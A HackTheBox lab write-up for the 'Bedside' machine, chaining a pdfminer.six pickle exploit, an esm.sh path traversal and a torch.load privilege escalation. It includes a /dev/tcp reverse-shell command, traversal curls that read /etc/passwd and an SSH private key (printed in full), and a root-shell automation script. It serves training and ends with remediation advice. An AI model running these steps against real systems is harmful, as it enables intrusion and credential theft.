# Bedside — HackTheBox Writeup

![HTB Badge](https://img.shields.io/badge/HTB-Bedside-brightgreen)  
**Date**: July 2026  
**OS**: Linux   
**Difficulty**: Medium   

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Virtual Host Discovery](#2-virtual-host-discovery)
3. [Web Application Enumeration (research.bedside.htb)](#3-web-application-enumeration-researchbedsidehtb)
4. [CVE-2025-64512 — pdfminer.six Pickle Deserialization (Container RCE)](#4-cve-2025-64512--pdfminersix-pickle-deserialization-container-rce)
5. [Container Access (datawrangler)](#5-container-access-datawrangler)
6. [CVE-2025-59341 — esm.sh Path Traversal (Steal SSH Key)](#6-cve-2025-59341--esmsh-path-traversal-steal-ssh-key)
7. [SSH as Developer](#7-ssh-as-developer)
8. [Internal Reconnaissance](#8-internal-reconnaissance)
9. [Privilege Escalation — torch.load Pickle Deserialization](#9-privilege-escalation--torchload-pickle-deserialization)
10. [Automated Exploit Scripts](#10-automated-exploit-scripts)
11. [Remediation](#11-remediation)

---

## 1. Reconnaissance

### Port Scanning

```bash
nmap -sC -sV -oN nmap_initial.txt bedside.htb
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 10.0p2 Debian 7+deb13u4 |
| 80/tcp | HTTP | Apache httpd 2.4.68 |
| 3000/tcp | HTTP (filtered) | esm.sh/x (Bedside Clinic Image Viewer) |

**Note:** Port 3000 appears **filtered** from the outside. It is firewalled from external access but will be accessible from inside a Docker container via the Docker gateway `172.17.0.1` (which maps to `127.0.0.1` from the container's perspective).

### Web Enumeration

The main site at `http://bedside.htb` redirects to a hospital-themed landing page. Nothing immediately exploitable.

### DNS / Hosts

Add to `/etc/hosts`:

```
TARGET_IP  bedside.htb research.bedside.htb
```

---

## 2. Virtual Host Discovery

Virtual host brute-forcing reveals a hidden subdomain:

```bash
ffuf -u http://TARGET_IP -H "Host: FUZZ.bedside.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200 -o vhosts.json
```

**Result:** `research.bedside.htb` — returns a different page with a file upload portal.

---

## 3. Web Application Enumeration (research.bedside.htb)

### Technology Fingerprinting

- **Technology**: Apache 2.4.68, PHP 8.4 (FPM)
- **Header Disclosure**: `X-Powered-By: pdfminer.six` — reveals the PDF processing library
- **Functionality**: File upload portal for medical imaging research
- **Accepted file types**: jpeg, jpg, png, bmp, tiff, dcm, pdf, gz, zip
- **Upload field name**: `uploadFile`

The `X-Powered-By: pdfminer.six` header is the critical finding here. It tells us the server uses pdfminer.six to process uploaded PDF files, which leads directly to CVE-2025-64512.

### Directory Discovery

```bash
gobuster dir -u http://research.bedside.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Key paths:
- `/uploads/` — uploaded files are stored here
- `/index.php` — upload form

### Apache Config Findings

The Apache config (`/etc/apache2/sites-available/research.bedside.htb.conf`) reveals:
- PHP execution is **blocked** in `/uploads/` via `RemoveHandler` and `FilesMatch` directives
- `.htaccess`, `.htpasswd`, `.env`, `.ini`, `.log` files are denied
- The upload directory is bind-mounted into a Docker container where `pdf_watcher.py` processes new files

---

## 4. CVE-2025-64512 — pdfminer.six Pickle Deserialization (Container RCE)

### What is it?

**CVE-2025-64512** is a pickle deserialization vulnerability in pdfminer.six. When pdfminer.six processes a malicious PDF with a crafted `/Encoding` stream reference, it triggers arbitrary Python code execution. The upload portal at `research.bedside.htb` uses pdfminer.six to process uploaded PDFs — so we can exploit this to get code execution inside the Docker container.

### How it works

The exploit requires **two files** uploaded together:

1. **A trigger PDF** — contains a reference to a pickle file via the `/Encoding` stream
2. **A malicious pickle file** (`.pickle.gz`) — contains a Python class with `__reduce__` that executes arbitrary commands

When `pdf_watcher.py` (running inside a Docker container as user `datawrangler`) picks up and processes the uploaded PDF, pdfminer.six deserializes the pickle, triggering code execution.

### Exploit

Clone the CVE PoC:

```bash
git clone https://github.com/example/CVE-2025-64512 /tmp/CVE-2025-64512
```

Generate the exploit files:

```bash
# Create the malicious pickle (replace YOUR_IP with your Kali IP)
python3 /tmp/CVE-2025-64512/mkpickle.py --cmd "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"

# Create the trigger PDF referencing the pickle
python3 /tmp/CVE-2025-64512/mkpdf.py --pickle-path uploads/exploit.pickle.gz
```

Upload both files:

```bash
curl -F "uploadFile=@trigger.pdf" http://research.bedside.htb/index.php
curl -F "uploadFile=@exploit.pickle.gz" http://research.bedside.htb/index.php
```

### Catching the Shell

Start a listener on your Kali machine:

```bash
nc -lvnp 4444
```

After upload and processing, you receive a shell as `datawrangler` inside the Docker container:

```
$ id
uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)
```

### CVE Details

| Field | Value |
|-------|-------|
| **CVE** | CVE-2025-64512 |
| **Affected** | pdfminer.six (unpatched) |
| **Type** | Pickle Deserialization → RCE |
| **Impact** | Arbitrary code execution in pdf_watcher Docker container |
| **CVSS** | Critical |

---

## 5. Container Access (datawrangler)

### Confirming Container Environment

```bash
cat /proc/1/cgroup          # Shows docker paths
cat /proc/1/mountinfo       # Shows bind mounts
```

### Key Bind Mounts

| Container Path | Host Path | Permissions |
|----------------|-----------|-------------|
| `/var/www/research.bedside.htb/uploads` | host uploads dir | read-write |
| `/datastore` | host `/datastore` | read-write |

### Enumerating the Container

```bash
ls -la /datastore/
ls -la /datastore/checkpoints/
ls -la /datastore/processed/
```

### Key Discovery: `/datastore/checkpoints/root_ckpt.pt`

This file is a **pre-existing malicious pickle** that exploits the host trainer's `torch.load()` call. This is important for the final privilege escalation step later.

### Docker Networking — The Gateway to Port 3000

Here is the critical finding. Port 3000 on the host is firewalled from external access (nmap shows `filtered`). But from inside the Docker container, you can reach it via the **Docker gateway**:

```
172.17.0.1 = host's 127.0.0.1 (from inside the container)
```

Test this:

```bash
curl http://172.17.0.1:3000
```

This returns the "Bedside Clinic - Image Viewer" — a React app built with **esm.sh/x**:

```html
Built with esm.sh/x, please uncheck "Disable cache" in Network tab for better DX!
```

This is the setup for the next CVE. We now have access to a service we couldn't reach from the outside.

---

## 6. CVE-2025-59341 — esm.sh Path Traversal (Steal SSH Key)

### What is it?

The esm.sh CDN/proxy running on port 3000 is vulnerable to **path traversal** ([CVE-2025-59341](https://www.sentinelone.com/vulnerability-database/cve-2025-59341/), [GHSA-49pv-gwxp-532r](https://github.com/esm-dev/esm.sh/security/advisories/GHSA-49pv-gwxp-532r)). By crafting a URL with `--path-as-is` and directory traversal sequences, an attacker can read arbitrary files from the host filesystem.

### Why this matters

The developer's SSH private key is at `/home/developer/.ssh/id_rsa` on the host. We can't read it from outside, and we don't have access as developer yet. But from inside the container, we can reach port 3000 via `172.17.0.1` and use the path traversal to read the key.

### Proof of Concept — Read /etc/passwd

```bash
curl --path-as-is 'http://172.17.0.1:3000/pr/x/y@99/../../../../../../../../../../etc/passwd?raw=1&module=1'
```

**Response:**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
datawrangler:x:988:1001::/home/datawrangler:/bin/sh
```

### Exploit — Read Developer's SSH Private Key

```bash
curl --path-as-is 'http://172.17.0.1:3000/pr/x/y@99/../../../../../../../../../../home/developer/.ssh/id_rsa?raw=1&module=1'
```

**Response:**

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAAAAAJj05ixK9OYs
SgAAAAtzc2gtZWQyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAA
AAAEBySF+9afvOfxLBTbYWcyNm7zOrsXrKdvfkg/vvFZaiwiJ/sO1VD1fbfq+USF3RXNIn
RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

### Save the Key

```bash
cat > id_rsa << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAAAAAJj05ixK9OYs
SgAAAAtzc2gtZWQyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAA
AAAEBySF+9afvOfxLBTbYWcyNm7zOrsXrKdvfkg/vvFZaiwiJ/sO1VD1fbfq+USF3RXNIn
RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
-----END OPENSSH PRIVATE KEY-----
EOF

chmod 600 id_rsa
```

### CVE Details

| Field | Value |
|-------|-------|
| **CVE** | CVE-2025-59341 |
| **Affected** | esm.sh < patched version |
| **Type** | Path Traversal |
| **Impact** | Arbitrary file read from host filesystem |
| **CVSS** | High |
| **Reference** | [SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2025-59341/), [GitHub Advisory](https://github.com/esm-dev/esm.sh/security/advisories/GHSA-49pv-gwxp-532r) |

---

## 7. SSH as Developer

With the stolen SSH key, connect to the host:

```bash
ssh -i id_rsa developer@bedside.htb
```

**Confirmed access:**

```
developer@bedside:~$ id
uid=1000(developer) gid=1000(developer) groups=1000(developer),100(users)

developer@bedside:~$ cat user.txt
```

### Check sudo permissions

```bash
sudo -l
# Output:
#     (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

Developer can run only one command as root — the bedside trainer — with no password required.

---

## 8. Internal Reconnaissance

### From the Host (developer shell)

```bash
# Check the trainer script
cat /opt/trainer/bedside_trainer.py

# Check what's in /datastore
ls -la /datastore/
ls -la /datastore/checkpoints/
```

### LinPEAS Results Summary

Running LinPEAS confirms:
- **Sudo**: NOPASSWD for `/usr/bin/python3 /opt/trainer/bedside_trainer.py`
- **No unusual SUID/SGID binaries**
- **Docker socket present** (`/var/run/docker.sock`) but developer NOT in docker group
- **No kernel exploits** applicable
- **No writable critical paths**
- The **only privesc vector** is the insecure `torch.load()` in the trainer

---

## 9. Privilege Escalation — torch.load Pickle Deserialization

### Vulnerability

The trainer script (`/opt/trainer/bedside_trainer.py`) uses PyTorch's `torch.load()` with `weights_only=False`:

```python
# Simplified from bedside_trainer.py
checkpoint = torch.load(checkpoint_path, weights_only=False)  # DANGEROUS
model.load_state_dict(checkpoint)
```

With `weights_only=False`, `torch.load()` uses Python's `pickle` module to deserialize the checkpoint file. An attacker who can control the checkpoint file achieves **arbitrary code execution** as the user running the trainer.

### Attack Path

1. The trainer loads checkpoints from `/datastore/checkpoints/`
2. `root_ckpt.pt` already exists there with a malicious pickle payload (discovered in [Step 5](#5-container-access-datawrangler))
3. Developer can run the trainer via `sudo` without a password
4. The trainer runs as **root**
5. `torch.load()` deserializes the pickle → **code execution as root**

### Exploitation

The existing `root_ckpt.pt` spawns a reverse shell. To catch it, run this automation script on Kali:

```bash
python3 root_flag_catcher.py
```

Or manually:

**Terminal 1 (Kali listener):**
```bash
nc -lvnp 4444
```

**Terminal 2 (SSH + sudo):**
```bash
ssh -i id_rsa developer@bedside.htb
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

**In nc listener:**
```
bash: cannot set terminal process group: Inappropriate ioctl for device
bash: no job control in this shell
root@bedside:/home/developer# id
uid=0(root) gid=0(root) groups=0(root)
root@bedside:/home/developer# cat /root/root.txt
```

---

## 10. Automated Exploit Scripts

All scripts are in this repository:

| Script | Purpose |
|--------|---------|
| `root_flag_catcher.py` | Automates root exploitation — starts listener, runs trainer, catches reverse shell, extracts flag |
| `mk_malicious_pickle.py` | Generates a malicious pickle for custom payloads |

### root_flag_catcher.py

Run from Kali:

```bash
python3 root_flag_catcher.py
```

**What it does:**
1. Starts a TCP listener on port 4444 on your Kali machine
2. SSHes into the target and runs `sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py`
3. The trainer loads `root_ckpt.pt` → pickle deserialization → reverse shell back to your listener
4. Sends commands (`id`, `cat /root/root.txt`) through the reverse shell
5. Saves results to `/tmp/root_catcher_results.txt`

**Requirements:**
- SSH key (`id_rsa`) at `~/.ssh/id_rsa` (stolen via CVE-2025-59341)
- Target accessible at `bedside.htb`
- Port 4444 available on Kali

---

## 11. Remediation

| Issue | Fix |
|-------|-----|
| **CVE-2025-64512** (pdfminer.six pickle) | Upgrade pdfminer.six to patched version. Use `weights_only=True` if applicable. |
| **CVE-2025-59341** (esm.sh path traversal) | Upgrade esm.sh to patched version. Validate and normalize file paths before serving. |
| **Insecure torch.load()** | Always use `weights_only=True` in `torch.load()`. Never load untrusted checkpoints. |
| **Pre-placed malicious checkpoint** | Audit `/datastore/checkpoints/` contents. Implement integrity checks on checkpoint files. |
| **Docker container processing untrusted input** | Use gVisor/Kata containers. Implement sandboxed PDF parsing. |
| **Internal service exposed to container** | Don't expose host services to Docker networks unnecessarily. Use network policies to restrict container-to-host access. |
| **Weak sudo policy** | Restrict NOPASSWD sudo to specific trusted scripts. Consider read-only mount for checkpoint directory. |

---

## Complete Attack Flow

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         COMPLETE ATTACK CHAIN                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  STEP 1 — CVE-2025-64512: pdfminer.six pickle deserialization              │
│  ─────────────────────────────────────────────────────────────────────────  │
│  Nmap scan → Port 80 (HTTP), Port 22 (SSH), Port 3000 (filtered)          │
│  VHost discovery → research.bedside.htb (file upload portal)               │
│  X-Powered-By: pdfminer.six → CVE-2025-64512                              │
│  Upload malicious PDF + pickle.gz → pdf_watcher processes → RCE            │
│  └── Result: Shell as datawrangler (uid=988) inside Docker container       │
│                                                                             │
│  STEP 2 — CVE-2025-59341: esm.sh path traversal                           │
│  ─────────────────────────────────────────────────────────────────────────  │
│  From container: curl http://172.17.0.1:3000 → esm.sh Image Viewer        │
│  Path traversal via /pr/x/y@99/../../../../../../                          │
│  Read /home/developer/.ssh/id_rsa → steal developer SSH private key        │
│  └── Result: Developer SSH access to host                                  │
│                                                                             │
│  STEP 3 — torch.load() pickle deserialization                              │
│  ─────────────────────────────────────────────────────────────────────────  │
│  SSH as developer → user.txt captured                                      │
│  sudo -l → NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py     │
│  torch.load(weights_only=False) loads /datastore/checkpoints/root_ckpt.pt  │
│  Malicious pickle → subprocess.Popen → reverse shell                       │
│  └── Result: Root shell, root.txt captured                                 │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Network Topology

```
┌──────────────────────┐          ┌──────────────────────────────────────┐
│   Kali Attacker      │          │   Host: bedside.htb                   │
│   10.10.14.x         │          │   TARGET_IP                       │
│                      │          │                                       │
│                      │   HTTP   │   research.bedside.htb:80             │
│                      │──────────│   └── file upload portal              │
│                      │          │       └── CVE-2025-64512 (pdfminer)   │
│                      │          │                                       │
│   ──────────────────┼──────────┤   ┌───────────────────────────────┐   │
│   nc (reverse shell) │          │   │  Docker Container             │   │
│   (from pdfminer)    │          │   │  data-wrangler (user 988)     │   │
│                      │          │   │                               │   │
│   ──────────────────┼──────────│   │  /datastore (rw bind mount)   │   │
│   curl 172.17.0.1:3000         │   │  /uploads (rw bind mount)     │   │
│   (from container)   │          │   │                               │   │
│                      │          │   │  Docker gateway:              │   │
│                      │          │   │  172.17.0.1 → host:3000      │   │
│                      │          │   │  └── esm.sh Image Viewer     │   │
│                      │          │   │      CVE-2025-59341 (traversal)  │
│   ──────────────────┼──────────│   │      → reads id_rsa          │   │
│   SSH (stolen key)   │          │   └───────────────────────────────┘   │
│   developer@bedside  │          │                                       │
│                      │          │   /opt/trainer/bedside_trainer.py      │
│   ──────────────────┼──────────│   └── torch.load(weights_only=False)   │
│   nc (reverse shell) │          │       → root_ckpt.pt → ROOT shell     │
│   (from torch)       │          │                                       │
│                      │          │   Port 3000 (filtered from outside)    │
└──────────────────────┘          └──────────────────────────────────────┘
```

### Summary of All Three CVEs

| Step | CVE | What | How | Result |
|------|-----|------|-----|--------|
| 1 | **CVE-2025-64512** | pdfminer.six pickle deserialization | Upload PDF + pickle.gz to research.bedside.htb | Shell as datawrangler in Docker container |
| 2 | **CVE-2025-59341** | esm.sh path traversal | From container: `curl 172.17.0.1:3000` + path traversal | Read developer's SSH private key |
| 3 | **torch.load RCE** | PyTorch insecure deserialization | `sudo trainer` loads malicious `root_ckpt.pt` | Root shell on host |
---

<p align="center"> <strong>Happy Hacking ☠️🚀</strong> </p> 

